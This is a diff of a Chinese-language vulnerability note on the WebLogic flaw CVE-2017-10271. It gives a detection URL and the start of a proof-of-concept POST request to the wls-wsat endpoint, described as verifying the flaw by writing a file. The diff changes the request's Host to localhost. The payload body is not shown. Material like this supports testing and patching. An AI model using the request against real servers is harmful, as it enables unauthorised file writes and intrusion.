@@ -5,11 +5,13 @@ CVE-2017-10271
 - 漏洞检测：访问http://host:7001/wls-wsat/CoordinatorPortType返回如下，则可能存在此漏洞
 ![title](https://i.loli.net/2019/05/20/5ce24e619807844967.jpg)
 
+# 验证环境
+
 # POC
 通过写入一个文件的形式进行简单验证
 ```
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
-Host: 192.168.8.148:7001
+Host: 127.0.0.1:7001
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Upgrade-Insecure-Requests: 1
